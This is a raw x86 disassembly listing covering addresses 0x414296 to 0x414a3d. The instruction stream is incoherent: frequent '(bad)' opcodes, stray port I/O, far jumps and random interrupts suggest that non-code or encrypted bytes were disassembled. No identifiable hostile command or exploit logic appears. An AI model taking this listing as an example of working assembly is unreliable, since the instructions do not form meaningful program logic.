  414296:	sbb    ecx,DWORD PTR [edx+0x3b662ccb]
  41429c:	imul   ebp,DWORD PTR [ebp+0x6985a9e7],0xfffffffa
  4142a3:	retf   
  4142a4:	addr16 jl 0x4142ba
  4142a7:	xchg   ebp,eax
  4142a8:	inc    ebx
  4142a9:	push   esi
  4142aa:	stos   DWORD PTR es:[edi],eax
  4142ab:	jae    0x414269
  4142ad:	jl     0x414272
  4142af:	add    BYTE PTR ds:0xb0bf8a8b,al
  4142b5:	sub    al,0x7c
  4142b7:	dec    edx
  4142b8:	jmp    0xdec73792
  4142bd:	popf   
  4142be:	mov    ?,WORD PTR [esi+edi*2+0x4d]
  4142c2:	(bad)  
  4142c3:	pop    ebx
  4142c4:	aam    0xca
  4142c6:	cmp    ebx,DWORD PTR [ebp+0x57]
  4142c9:	scas   al,BYTE PTR es:[edi]
  4142ca:	imul   DWORD PTR es:[ebp+0x5cb6aae0]
  4142d1:	jecxz  0x4142cd
  4142d3:	add    ecx,DWORD PTR ds:0x758bf18
  4142d9:	leave  
  4142da:	push   ebx
  4142db:	mov    dh,0x90
  4142dd:	push   ebx
  4142de:	jbe    0x414285
  4142e0:	sahf   
  4142e1:	adc    BYTE PTR [esi],cl
  4142e3:	inc    eax
  4142e4:	adc    DWORD PTR [edx],ebp
  4142e6:	pop    ecx
  4142e7:	pop    ss
  4142e8:	fwait
  4142e9:	lods   al,BYTE PTR ds:[esi]
  4142ea:	mov    cl,0xb8
  4142ec:	sbb    al,bh
  4142ee:	out    0x22,eax
  4142f0:	jno    0x414350
  4142f2:	fadd   DWORD PTR [edi]
  4142f4:	push   ebx
  4142f5:	loope  0x41436a
  4142f7:	mov    edx,0xdf8e6557
  4142fc:	add    al,0xfe
  4142fe:	arpl   WORD PTR [esi],sp
  414300:	popa   
  414301:	in     al,0x3
  414303:	xchg   esi,eax
  414304:	or     cl,ch
  414306:	ret    0x62b0
  414309:	bnd je 0x4142e4
  41430c:	xor    ecx,DWORD PTR [ecx+0x50b83b24]
  414312:	jno    0x414333
  414314:	outs   dx,DWORD PTR ds:[esi]
  414315:	mov    eax,0x4ec7aa31
  41431a:	int    0x95
  41431c:	aam    0x8c
  41431e:	jns    0x414304
  414320:	in     eax,dx
  414321:	mov    ds:0x72448182,al
  414326:	ins    BYTE PTR es:[edi],dx
  414327:	cmp    BYTE PTR [esi+0x74],al
  41432a:	add    eax,0xa986cf51
  41432f:	jnp    0x414303
  414331:	xchg   ecx,eax
  414332:	loope  0x41436f
  414334:	jmp    DWORD PTR [edi-0x48d176aa]
  41433a:	push   ds
  41433b:	push   ecx
  41433c:	fcom   QWORD PTR [ecx-0x20]
  41433f:	mov    ebx,0xc14e4f38
  414344:	adc    DWORD PTR [ebp+0x58],ecx
  414347:	into   
  414348:	jecxz  0x41438d
  41434a:	push   cs
  41434b:	mov    ebx,0x33b94fa4
  414350:	iret   
  414351:	scas   eax,DWORD PTR es:[edi]
  414352:	inc    eax
  414353:	dec    esi
  414354:	sbb    eax,DWORD PTR [esi-0x74ef63fd]
  41435a:	pushf  
  41435b:	test   al,0x65
  41435d:	ret    0x7997
  414360:	pop    esi
  414361:	mov    dh,0x7a
  414363:	xor    eax,DWORD PTR [esp+esi*8+0x31]
  414367:	cli    
  414368:	rol    DWORD PTR [eax+ebp*8+0xff893de],0x61
  414370:	aaa    
  414371:	jb     0x414388
  414373:	cmp    bl,BYTE PTR [ecx+esi*1-0x49]
  414377:	ret    0x6b1c
  41437a:	inc    edi
  41437b:	jb     0x4143bf
  41437d:	leave  
  41437e:	(bad)  
  41437f:	dec    edx
  414380:	and    eax,0x15f4db7
  414385:	mov    esp,0x5e598797
  41438a:	jmp    0x4143bd
  41438c:	sbb    DWORD PTR [ecx+0x1],ebx
  41438f:	out    0xde,eax
  414391:	enter  0x2cae,0x0
  414395:	adc    eax,0x7b850656
  41439a:	cmc    
  41439b:	cli    
  41439c:	push   ecx
  41439d:	inc    eax
  41439e:	aaa    
  41439f:	(bad)  
  4143a0:	(bad)  
  4143a2:	cmp    edx,DWORD PTR [eax-0x1d0df9db]
  4143a8:	pop    edi
  4143a9:	push   esi
  4143aa:	ins    BYTE PTR es:[edi],dx
  4143ab:	cmp    al,0x85
  4143ad:	mov    DWORD PTR [eax],ebp
  4143af:	rcl    BYTE PTR [edi-0x76],0x33
  4143b3:	push   eax
  4143b4:	mov    eax,ecx
  4143b6:	pop    es
  4143b7:	dec    ebp
  4143b8:	xlat   BYTE PTR ds:[ebx]
  4143b9:	nop
  4143ba:	out    dx,eax
  4143bb:	push   esi
  4143bc:	ret    
  4143bd:	dec    ecx
  4143be:	adc    al,0x40
  4143c0:	ds aas 
  4143c2:	adc    BYTE PTR [ebx+ecx*2+0x6497d652],dl
  4143c9:	inc    ebp
  4143ca:	jle    0x4143ba
  4143cc:	jae    0x4143f7
  4143ce:	jmp    0x414385
  4143d0:	sub    eax,0xdcc32395
  4143d5:	mov    eax,ds:0x1ecf09ec
  4143da:	xchg   edi,eax
  4143db:	ins    BYTE PTR es:[edi],dx
  4143dc:	xchg   esp,eax
  4143dd:	sar    esp,1
  4143df:	xor    al,0x7
  4143e1:	jns    0x41443a
  4143e3:	sar    BYTE PTR [edi],1
  4143e5:	add    ah,BYTE PTR [ebx+0x47d0627a]
  4143eb:	dec    ebp
  4143ec:	mov    cl,0x99
  4143ee:	mov    WORD PTR [edi],ss
  4143f0:	sti    
  4143f1:	xor    eax,0x53ed81ab
  4143f6:	ror    DWORD PTR [ebp-0x5],1
  4143f9:	sub    al,0xc6
  4143fb:	dec    edx
  4143fc:	out    dx,eax
  4143fd:	and    DWORD PTR [ebp-0x424f9879],edi
  414403:	dec    ecx
  414404:	dec    ebp
  414405:	push   ecx
  414406:	sbb    DWORD PTR [eax+0x1d],esp
  414409:	out    dx,al
  41440a:	adc    BYTE PTR [ecx-0x2c50349d],bl
  414410:	(bad)  
  414412:	mov    bh,0xa6
  414414:	inc    ebp
  414415:	neg    BYTE PTR [edi+0x6d282c81]
  41441b:	cmc    
  41441c:	cs out 0x3a,eax
  41441f:	frstor [edi+0x64fee830]
  414425:	sbb    eax,0xade5fd6d
  41442a:	mov    esi,0x28dbd884
  41442f:	rcl    BYTE PTR [ecx-0x2c],1
  414432:	jne    0x4143c2
  414434:	popf   
  414435:	xchg   edx,eax
  414436:	add    esi,DWORD PTR [ebx+0x487c31fb]
  41443c:	pushf  
  41443d:	jmp    0xa72cf869
  414442:	xchg   ecx,eax
  414443:	pop    esi
  414444:	sub    DWORD PTR [edx-0x68e670b0],edx
  41444a:	(bad)  
  41444b:	sahf   
  41444c:	dec    eax
  41444d:	fstp   TBYTE PTR [eax-0x8]
  414450:	aaa    
  414451:	mov    WORD PTR [edi],cs
  414453:	(bad)  
  414454:	div    BYTE PTR [edi-0x4]
  414457:	inc    ebp
  414458:	jno    0x41449f
  41445a:	xchg   esp,eax
  41445b:	ja     0x414409
  41445d:	fdivr  st,st(5)
  41445f:	sbb    al,0x27
  414461:	xchg   ecx,eax
  414462:	or     esi,DWORD PTR [edx+0x6921e8f4]
  414468:	inc    ecx
  414469:	mov    bh,0x65
  41446b:	add    eax,0xafd5282b
  414470:	adc    DWORD PTR [eax+0x1a3fa1fb],ebp
  414476:	stc    
  414477:	loop   0x41446b
  414479:	mov    eax,ds:0x7ebd8bbf
  41447e:	add    al,0x60
  414480:	jo     0x414495
  414482:	in     eax,0xc2
  414484:	xchg   ebx,eax
  414485:	sbb    dl,ch
  414487:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414488:	sbb    BYTE PTR [ebx-0x3e],dl
  41448b:	(bad)  
  41448c:	cld    
  41448d:	push   cs
  41448e:	test   dl,0x54
  414491:	mov    edx,0x3a4d4af4
  414496:	rcl    DWORD PTR [ebp+0x7],0xd2
  41449a:	jmp    0xa52af0a0
  41449f:	cs mov edx,0xe2e1c270
  4144a5:	adc    BYTE PTR [edx+0x46],ch
  4144a8:	inc    ebx
  4144a9:	outs   dx,DWORD PTR ds:[esi]
  4144aa:	setns  BYTE PTR [ebp-0x6b]
  4144ae:	call   0x9937f2e7
  4144b3:	dec    esp
  4144b4:	cs push es
  4144b6:	add    eax,0xe50d22bb
  4144bb:	sbb    ebp,edi
  4144bd:	inc    ecx
  4144be:	arpl   WORD PTR [eax+0x2e2bae43],sp
  4144c4:	fsubrp st(5),st
  4144c6:	push   ds
  4144c7:	jl     0x414474
  4144c9:	push   edi
  4144ca:	loope  0x414482
  4144cc:	pop    esp
  4144cd:	ds mov edx,ds
  4144d0:	inc    ebx
  4144d1:	mov    DWORD PTR [edx+0x30c25ee],edx
  4144d7:	dec    eax
  4144d8:	and    al,0xa7
  4144da:	stos   BYTE PTR es:[edi],al
  4144db:	inc    esi
  4144dc:	mov    ds:0xd3818307,al
  4144e1:	outs   dx,BYTE PTR ds:[esi]
  4144e2:	inc    edx
  4144e3:	xor    BYTE PTR [ebx],ah
  4144e5:	sbb    DWORD PTR [esp+ecx*1-0x13],ebx
  4144e9:	jne    0x414526
  4144eb:	mov    esi,eax
  4144ed:	sbb    ebp,DWORD PTR [eax+0x5a3ea874]
  4144f3:	pop    esp
  4144f4:	dec    ebp
  4144f5:	pop    ecx
  4144f6:	xor    ah,dl
  4144f8:	in     eax,0xbd
  4144fa:	jnp    0x414576
  4144fc:	lods   eax,DWORD PTR gs:[esi]
  4144fe:	mov    WORD PTR [edx],cs
  414500:	lds    esi,FWORD PTR [edx]
  414502:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414503:	mov    esp,0x38545d74
  414508:	adc    al,ah
  41450a:	pop    es
  41450b:	or     al,0x90
  41450d:	inc    esp
  41450e:	pop    edx
  41450f:	dec    ecx
  414510:	dec    ebp
  414511:	or     al,0x47
  414513:	sti    
  414514:	out    dx,eax
  414515:	retf   
  414516:	clc    
  414517:	(bad)  
  414518:	mov    esi,0x144ec347
  41451d:	loope  0x4144c0
  41451f:	dec    edi
  414520:	je     0x414501
  414522:	imul   ebx,DWORD PTR [ecx],0xffffff87
  414525:	loopne 0x41459c
  414527:	int3   
  414528:	iret   
  414529:	aad    0x6d
  41452b:	push   ds
  41452c:	xor    bl,bl
  41452e:	push   cs
  41452f:	cmp    eax,0xa87af98a
  414534:	ja     0x414564
  414536:	mov    eax,0xa6636446
  41453b:	fs dec ebp
  41453d:	adc    BYTE PTR [ebp-0xc045f0d],dl
  414543:	sub    DWORD PTR [esp+ebx*1],esi
  414546:	mov    WORD PTR [ebx],ss
  414548:	sbb    eax,ebp
  41454a:	shld   DWORD PTR [edx+eax*1+0x13],ecx,0x0
  414550:	into   
  414551:	lods   al,BYTE PTR ds:[esi]
  414552:	jmp    0xfca5:0xd41fb7bb
  414559:	push   ebp
  41455a:	jp     0x41455a
  41455c:	pop    ebx
  41455d:	ficomp WORD PTR [eax]
  41455f:	icebp  
  414560:	inc    esi
  414561:	and    BYTE PTR [edx],al
  414563:	inc    BYTE PTR [ecx-0x4bd581d0]
  414569:	push   eax
  41456a:	adc    al,0x4a
  41456c:	in     al,dx
  41456d:	pop    ds
  41456e:	out    dx,eax
  41456f:	xor    dl,BYTE PTR [esp+edi*2]
  414572:	add    al,0x3
  414574:	adc    ecx,DWORD PTR ds:0xd591bcb4
  41457a:	call   0x2b53:0xce429607
  414581:	pop    edi
  414582:	push   ebp
  414583:	xor    BYTE PTR [eax],al
  414585:	cwde   
  414586:	pop    ecx
  414587:	xor    dh,BYTE PTR es:[ebx]
  41458a:	out    0xb3,al
  41458c:	inc    ebx
  41458d:	push   es
  41458e:	and    eax,0xb6f3c611
  414593:	rol    BYTE PTR [esi+0x5bc3379c],0x68
  41459a:	mov    dl,0x2a
  41459c:	pop    ebp
  41459d:	add    edi,DWORD PTR [eax+0x1f1e277]
  4145a3:	mov    ah,0xfa
  4145a5:	test   al,0x99
  4145a7:	or     al,0x8
  4145a9:	das    
  4145aa:	pop    ecx
  4145ab:	out    dx,al
  4145ac:	(bad)  
  4145ad:	cmp    dl,ch
  4145af:	out    dx,al
  4145b0:	inc    esp
  4145b1:	shl    eax,1
  4145b3:	mov    edi,0x8a8126b8
  4145b8:	pop    ds
  4145b9:	pop    ecx
  4145ba:	add    BYTE PTR [ebx+0x64],0x8b
  4145be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145bf:	fs (bad) 
  4145c2:	mov    dh,BYTE PTR [esi+0x39]
  4145c5:	and    al,0x98
  4145c7:	pushf  
  4145c8:	pop    ebx
  4145c9:	(bad)  [edx]
  4145cb:	icebp  
  4145cc:	cdq    
  4145cd:	push   edx
  4145ce:	inc    edi
  4145cf:	sub    DWORD PTR [edx],0x267a6c22
  4145d5:	cmp    BYTE PTR [esi-0x63],al
  4145d8:	call   0xcda9:0xc7fbcac5
  4145df:	(bad)  
  4145e0:	cmp    edi,edi
  4145e2:	pop    es
  4145e3:	mov    cl,0x7a
  4145e5:	idiv   DWORD PTR [ecx]
  4145e7:	dec    esp
  4145e8:	stos   BYTE PTR es:[edi],al
  4145e9:	inc    ecx
  4145ea:	mov    eax,ds:0x5e0a21c9
  4145ef:	ss nop
  4145f1:	out    dx,eax
  4145f2:	mov    WORD PTR [eax],ds
  4145f4:	mov    ch,0xfb
  4145f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145f7:	div    DWORD PTR [edi]
  4145f9:	js     0x414664
  4145fb:	dec    ebp
  4145fc:	pop    edx
  4145fd:	mov    DWORD PTR [ecx*1+0x39515786],0x8abeca95
  414608:	xchg   ebx,eax
  414609:	daa    
  41460a:	call   edi
  41460c:	mov    esi,0x3587b314
  414611:	fist   DWORD PTR [edx+0x69]
  414614:	dec    edi
  414615:	cs in  eax,0x16
  414618:	pop    edx
  414619:	fist   DWORD PTR [esp+eiz*2+0x6e]
  41461d:	cmp    esi,ecx
  41461f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414620:	sub    al,0xff
  414622:	jle    0x41469e
  414624:	hlt    
  414625:	or     dl,BYTE PTR [esi+0x1]
  414628:	add    ch,ah
  41462a:	push   0xfffffffa
  41462c:	push   esi
  41462d:	fisttp DWORD PTR ds:0xced62f31
  414633:	mov    eax,0xbbdc180a
  414638:	add    BYTE PTR [ecx],al
  41463a:	jns    0x414647
  41463c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41463d:	or     al,0x27
  41463f:	shl    ah,1
  414641:	rcl    DWORD PTR [eax-0x45],cl
  414644:	mov    ds:0x50599839,al
  414649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41464a:	xchg   esp,eax
  41464b:	retf   0x20be
  41464e:	push   ds
  41464f:	xor    eax,0xe8c11cfe
  414654:	aad    0x0
  414656:	retf   0x9ea
  414659:	loopne 0x414600
  41465b:	jns    0x4146b7
  41465d:	jl     0x4146aa
  41465f:	push   eax
  414660:	out    0x61,ax
  414663:	mov    eax,0x23052d95
  414668:	push   ds
  414669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41466a:	iret   
  41466b:	ret    
  41466c:	inc    edx
  41466d:	push   0x44
  41466f:	pop    edi
  414670:	frstor [edx+0x4717bcce]
  414676:	jmp    0x4146b9
  414678:	cs aad 0x5e
  41467b:	pop    ebx
  41467c:	mul    DWORD PTR [ecx]
  41467e:	pop    esi
  41467f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414680:	pushf  
  414681:	les    ebp,FWORD PTR [edx]
  414683:	popf   
  414684:	jp     0x41460a
  414686:	shl    BYTE PTR [eax],0x5f
  414689:	add    edi,DWORD PTR [ecx+0x78]
  41468c:	jp     0x4146c6
  41468e:	loopne 0x414682
  414690:	dec    ebx
  414691:	fistp  DWORD PTR [bp+di]
  414694:	test   BYTE PTR [eax-0x174cb9fb],bl
  41469a:	cmp    DWORD PTR [esi+esi*1+0x176bdc63],esp
  4146a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146a2:	mov    eax,0x46fac030
  4146a7:	out    dx,eax
  4146a8:	outs   dx,BYTE PTR ds:[esi]
  4146a9:	enter  0x13d2,0x18
  4146ad:	sbb    ebx,DWORD PTR [edi-0x75]
  4146b0:	fstp   DWORD PTR [edi-0x4837ff36]
  4146b6:	dec    esi
  4146b7:	fadd   QWORD PTR [edx+0x74]
  4146ba:	aas    
  4146bb:	adc    BYTE PTR [ebp+0x72],ah
  4146be:	(bad)  
  4146bf:	push   esi
  4146c0:	dec    eax
  4146c1:	push   ebx
  4146c2:	jmp    0x67086d4b
  4146c7:	stos   DWORD PTR es:[edi],eax
  4146c8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4146c9:	fbld   TBYTE PTR [eax+0x40]
  4146cc:	mov    ds:0x4acc8307,eax
  4146d1:	je     0x4146ba
  4146d3:	dec    ebp
  4146d4:	pushf  
  4146d5:	push   edx
  4146d6:	sub    bl,BYTE PTR [edi+0x4c70be8e]
  4146dc:	xor    ah,BYTE PTR [eax]
  4146de:	je     0x414688
  4146e0:	fld    DWORD PTR [eax-0x1d]
  4146e3:	rol    cl,cl
  4146e5:	pop    edx
  4146e6:	int3   
  4146e7:	and    edx,DWORD PTR [ebp-0x3b0d3521]
  4146ed:	cwde   
  4146ee:	rcl    DWORD PTR [ebx],0x2
  4146f1:	data16 xor BYTE PTR [edx+0x1e],0x97
  4146f6:	mov    edx,0x797d9058
  4146fb:	and    DWORD PTR es:[ebp+ecx*1+0x430ba6a4],esp
  414703:	jb     0x4146ae
  414705:	xchg   edi,eax
  414706:	aas    
  414707:	cs sbb eax,0x70bdd26c
  41470d:	(bad)  
  41470f:	fdivr  DWORD PTR [edx]
  414711:	xchg   edi,eax
  414712:	jno    0x4146e2
  414714:	int3   
  414715:	ror    DWORD PTR [ebx+0x3c],cl
  414718:	out    dx,al
  414719:	adc    cl,BYTE PTR [ecx+0x34]
  41471c:	adc    eax,0x43b03261
  414721:	lea    ecx,[eax+esi*4]
  414724:	cmc    
  414725:	dec    ebp
  414726:	clc    
  414727:	test   DWORD PTR [edi-0x4e],ebp
  41472a:	or     BYTE PTR [ebx],0x85
  41472d:	and    ah,dl
  41472f:	xchg   ebx,eax
  414730:	dec    esp
  414731:	dec    ecx
  414732:	mov    al,0x94
  414734:	aam    0x2b
  414736:	push   edi
  414737:	inc    eax
  414738:	repnz inc ecx
  41473a:	or     DWORD PTR [ecx],ebx
  41473c:	add    al,dl
  41473e:	jle    0x4146e3
  414740:	fmul   DWORD PTR [ecx+0x16]
  414743:	dec    eax
  414744:	pop    ss
  414745:	out    0x54,al
  414747:	inc    ebx
  414748:	cld    
  414749:	shl    BYTE PTR [esi+0x73b5e4d7],0x82
  414750:	or     BYTE PTR [ecx+0x72],0x4
  414754:	cmp    esi,0xffffffb3
  414757:	mov    ds:0x9aa73c28,al
  41475c:	scas   al,BYTE PTR es:[edi]
  41475d:	inc    edx
  41475e:	and    al,0x31
  414760:	(bad)  
  414761:	mov    WORD PTR [edi-0x38],gs
  414764:	shl    esi,0xb0
  414767:	ins    BYTE PTR es:[edi],dx
  414768:	xor    dl,BYTE PTR [ecx+0x1f022062]
  41476e:	fsub   DWORD PTR gs:[edi+0x1fbcafeb]
  414775:	(bad)  
  414777:	pop    ebx
  414778:	inc    ebx
  414779:	and    eax,esp
  41477b:	or     BYTE PTR [ebp+0x3dc55d1a],cl
  414781:	retf   
  414782:	outs   dx,DWORD PTR ds:[esi]
  414783:	ds retf 
  414785:	dec    ebp
  414786:	(bad)  
  414788:	fdivr  DWORD PTR gs:[esp+ebp*8-0x73]
  41478d:	push   cs
  41478e:	jbe    0x41478e
  414790:	add    al,0x58
  414792:	into   
  414793:	jmp    0x8a89a3c2
  414798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414799:	stc    
  41479a:	pop    edi
  41479b:	push   eax
  41479c:	push   0x16
  41479e:	les    ebp,FWORD PTR [esi]
  4147a0:	xor    DWORD PTR [esi+0x11ba5416],esp
  4147a6:	mov    ds:0x6eaed80e,eax
  4147ab:	mov    ds:0xccc644ba,eax
  4147b0:	jl     0x41479b
  4147b2:	ja     0x4147f0
  4147b4:	jle    0x4147fa
  4147b6:	pminsw mm6,mm4
  4147b9:	push   eax
  4147ba:	jnp    0x4147e1
  4147bc:	in     eax,0xe0
  4147be:	jge    0x414756
  4147c0:	cmp    edx,DWORD PTR [ecx]
  4147c2:	or     BYTE PTR [ebp+0x24],bl
  4147c5:	movsx  ecx,BYTE PTR [esi-0x8]
  4147c9:	out    0x34,al
  4147cb:	ss xchg edi,eax
  4147cd:	test   al,0xc9
  4147cf:	xrelease mov BYTE PTR [esi+0x1a],dh
  4147d3:	mov    al,0x41
  4147d5:	pop    es
  4147d6:	push   0x0
  4147d8:	clc    
  4147d9:	outs   dx,BYTE PTR ds:[esi]
  4147da:	mov    ds:0x83850f54,al
  4147df:	ds push ds
  4147e1:	jo     0x4147bb
  4147e3:	call   0x6e09ec30
  4147e8:	rcl    BYTE PTR [edx],cl
  4147ea:	push   ss
  4147eb:	ds sub bh,ah
  4147ee:	sub    al,0xc2
  4147f0:	or     BYTE PTR [edi],dl
  4147f2:	or     esi,DWORD PTR [ebx-0x51]
  4147f5:	jp     0x4147e7
  4147f7:	cmp    DWORD PTR [edx-0x7],edx
  4147fa:	inc    eax
  4147fb:	mov    DWORD PTR [edx],eax
  4147fd:	stos   DWORD PTR es:[edi],eax
  4147fe:	jno    0x4147ff
  414800:	cmp    esp,DWORD PTR [edx-0x419f4913]
  414806:	xchg   DWORD PTR [esi+0x6f],esi
  414809:	data16 sti 
  41480b:	js     0x414797
  41480d:	jns    0x4147dc
  41480f:	leave  
  414810:	iret   
  414811:	pop    ecx
  414812:	cmp    ch,BYTE PTR [ebx-0x56]
  414815:	pop    esi
  414816:	inc    edx
  414817:	sub    DWORD PTR [ebx-0x578a8737],ebx
  41481d:	div    esp
  41481f:	or     esi,DWORD PTR [eax-0x70]
  414822:	sbb    dh,ch
  414824:	mov    dl,0x27
  414826:	xor    al,0x18
  414828:	xchg   BYTE PTR ds:0x36d474db,dh
  41482e:	int3   
  41482f:	lahf   
  414830:	jb     0x41488e
  414832:	leave  
  414833:	push   ebx
  414834:	int3   
  414835:	mov    cs,WORD PTR [esi]
  414837:	inc    esp
  414838:	and    eax,0xfbda5749
  41483d:	dec    BYTE PTR [eax+ebx*2]
  414840:	mov    esi,0x13162b5e
  414845:	xor    bh,BYTE PTR [eax+ebx*2-0x7643f2e3]
  41484c:	es and dh,ch
  41484f:	inc    BYTE PTR [edi+esi*2-0x4ca8f766]
  414856:	dec    edx
  414857:	test   BYTE PTR [ebp+0x6b4ea24a],dh
  41485d:	arpl   WORD PTR [ebx-0x1711a1aa],bx
  414863:	adc    bh,BYTE PTR [ebx-0x1c]
  414866:	imul   esi,DWORD PTR [edx-0x49],0x59e3d12f
  41486d:	mov    eax,0x1841e87b
  414872:	aad    0x4
  414874:	lahf   
  414875:	leave  
  414876:	rol    al,0x8a
  414879:	data16 loopne 0x414838
  41487c:	mov    dl,0x91
  41487e:	pop    ebx
  41487f:	jb     0x414880
  414881:	stos   BYTE PTR es:[edi],al
  414882:	or     edx,DWORD PTR [ebp-0x49]
  414885:	call   0x905e:0x9fcef525
  41488c:	hlt    
  41488d:	add    eax,0x32767296
  414892:	jle    0x41483d
  414894:	les    ebx,FWORD PTR [esi]
  414896:	inc    ecx
  414897:	lahf   
  414898:	retf   
  414899:	cmp    al,0x57
  41489b:	pusha  
  41489c:	adc    BYTE PTR [ebp-0x6618f4b1],ah
  4148a2:	cmp    al,0x55
  4148a4:	aam    0xcc
  4148a6:	pop    edx
  4148a7:	push   ds
  4148a8:	xor    al,BYTE PTR ds:0x4b8e5e5
  4148ae:	cmp    DWORD PTR [esi-0x55],edx
  4148b1:	fcom   DWORD PTR [esi-0x52]
  4148b4:	shl    edi,cl
  4148b6:	sar    DWORD PTR [esi+0x3c],0xd3
  4148ba:	or     DWORD PTR [ecx-0xe],0xdfed6ba8
  4148c1:	push   0xffffffd2
  4148c3:	sub    BYTE PTR [esp+ebx*1-0x34],0xa4
  4148c8:	cmc    
  4148c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148ca:	cli    
  4148cb:	inc    esi
  4148cc:	cmc    
  4148cd:	and    edx,esi
  4148cf:	cmp    DWORD PTR [ebx-0x79e98c40],0x1b8a0f0a
  4148d9:	dec    eax
  4148da:	inc    esi
  4148db:	cmp    bl,BYTE PTR [edi-0x13622306]
  4148e1:	sub    BYTE PTR ss:[edi+0x62fe3205],cl
  4148e8:	stos   BYTE PTR es:[edi],al
  4148e9:	int    0xf8
  4148eb:	imul   ebx,esi,0x5f
  4148ee:	inc    esp
  4148ef:	scas   al,BYTE PTR es:[edi]
  4148f0:	add    cl,BYTE PTR [ecx+0x31]
  4148f3:	adc    al,0x16
  4148f5:	dec    eax
  4148f6:	add    BYTE PTR [ecx-0x72],bl
  4148f9:	neg    DWORD PTR [edx-0x7a]
  4148fc:	out    0xed,eax
  4148fe:	ret    0xc631
  414901:	jmp    0x31cc277f
  414906:	xchg   esp,edi
  414908:	xlat   BYTE PTR ds:[ebx]
  414909:	ud0    esp,DWORD PTR [eax]
  41490c:	fbld   TBYTE PTR [ebp-0x18]
  41490f:	out    dx,al
  414910:	jecxz  0x4148c4
  414912:	adc    esi,DWORD PTR [esi]
  414914:	pop    ds
  414915:	pop    eax
  414916:	pop    ecx
  414917:	jns    0x414987
  414919:	sbb    DWORD PTR gs:[ebp+0x4b],edx
  41491d:	stc    
  41491e:	adc    ebp,DWORD PTR [ecx]
  414920:	adc    al,BYTE PTR [edx]
  414922:	sub    al,0x9d
  414924:	push   esp
  414925:	mov    DWORD PTR [ebx+0x30],esp
  414928:	int    0x40
  41492a:	rcl    BYTE PTR [ebp+0x52],0x63
  41492e:	mov    ebx,0x3e23ff24
  414933:	pop    ds
  414934:	mov    ecx,0xafab41b8
  414939:	jbe    0x414917
  41493b:	mov    edi,0xc2e432b9
  414940:	push   0x73
  414942:	mov    edi,edx
  414944:	push   edi
  414945:	xchg   ebp,eax
  414946:	mov    eax,0x926fc70b
  41494b:	or     BYTE PTR [ebx],ch
  41494d:	xor    eax,0x180f0004
  414952:	inc    ebx
  414953:	and    eax,0xddf7110
  414958:	xchg   DWORD PTR [ecx-0x7868c59a],eax
  41495e:	jecxz  0x414954
  414960:	test   BYTE PTR [ebx],0x7a
  414963:	loopne 0x414907
  414965:	xchg   ebx,eax
  414966:	icebp  
  414967:	loop   0x414991
  414969:	imul   edx,DWORD PTR [ebx+ecx*2-0x169a7ff6],0xee0e185
  414974:	mov    dh,0xe7
  414976:	add    al,0x2b
  414978:	ins    BYTE PTR es:[edi],dx
  414979:	mov    eax,0xf89e7623
  41497e:	mov    BYTE PTR [ecx],al
  414980:	mov    edx,0xf637b717
  414985:	stos   BYTE PTR es:[edi],al
  414986:	add    al,bh
  414988:	mov    ds:0x298d03e1,eax
  41498d:	sar    ch,0x21
  414990:	rcr    BYTE PTR [ebx+0x18da64cf],1
  414996:	cwde   
  414997:	retf   0x41e
  41499a:	and    ah,BYTE PTR [edi+ecx*8+0x1a]
  41499e:	int    0x6b
  4149a0:	sbb    eax,0x5682b9af
  4149a5:	stos   DWORD PTR es:[edi],eax
  4149a6:	add    dl,ah
  4149a8:	mov    edx,0xf650a81c
  4149ad:	cmp    al,0x77
  4149af:	popf   
  4149b0:	or     al,0x2b
  4149b2:	ret    0xb35
  4149b5:	cmp    bl,BYTE PTR [ecx-0x40]
  4149b8:	fidiv  DWORD PTR [ecx+0x6]
  4149bb:	fld    st(1)
  4149bd:	fdivr  DWORD PTR [eax+0x7b]
  4149c0:	scas   al,BYTE PTR es:[edi]
  4149c1:	dec    edi
  4149c2:	jns    0x4149da
  4149c4:	mov    WORD PTR [ebp-0x7c6164e7],ds
  4149ca:	ret    0xdb71
  4149cd:	and    al,0xc3
  4149cf:	outs   dx,DWORD PTR ds:[esi]
  4149d0:	xchg   edi,eax
  4149d1:	dec    ecx
  4149d2:	push   ebx
  4149d3:	xor    DWORD PTR [esi+0x5a569310],ebx
  4149d9:	fisttp QWORD PTR [edx-0x1c796169]
  4149df:	xor    dl,0xe2
  4149e2:	in     eax,0x7f
  4149e4:	sbb    DWORD PTR [esi+0x6],edx
  4149e7:	jae    0x4149b5
  4149e9:	cli    
  4149ea:	dec    esp
  4149eb:	outs   dx,BYTE PTR ds:[esi]
  4149ed:	ins    BYTE PTR es:[edi],dx
  4149ee:	mov    al,ds:0x75618977
  4149f3:	mov    ecx,0xde597987
  4149f8:	xor    bl,bh
  4149fa:	push   edx
  4149fb:	mov    ah,0x85
  4149fd:	mov    edi,esp
  4149ff:	in     al,0x41
  414a01:	inc    ebp
  414a02:	xor    BYTE PTR [eax],0x46
  414a05:	pop    esi
  414a06:	push   ds
  414a07:	int    0x65
  414a09:	fmul   DWORD PTR [edi-0x64]
  414a0c:	jg     0x4149d3
  414a0e:	pop    ebp
  414a0f:	add    al,0x3f
  414a11:	arpl   dx,di
  414a13:	div    DWORD PTR [edx+0x7740e5a9]
  414a19:	inc    ecx
  414a1a:	imul   ecx,DWORD PTR ds:0xda95a902,0xffffffc2
  414a21:	push   ss
  414a22:	mov    ebp,DWORD PTR [ebx+0x3bb82a1e]
  414a28:	rcl    BYTE PTR [eax+0x29bc8bc4],1
  414a2e:	dec    ebx
  414a2f:	ds dec ecx
  414a31:	retf   
  414a32:	fild   DWORD PTR [ecx]
  414a34:	mov    cl,ah
  414a36:	mov    ch,0xed
  414a38:	in     eax,dx
  414a39:	sbb    al,0xa0
  414a3b:	pop    eax
  414a3c:	das    
  414a3d:	xor    esi,DWORD PTR [ebx-0x6d2adad4]
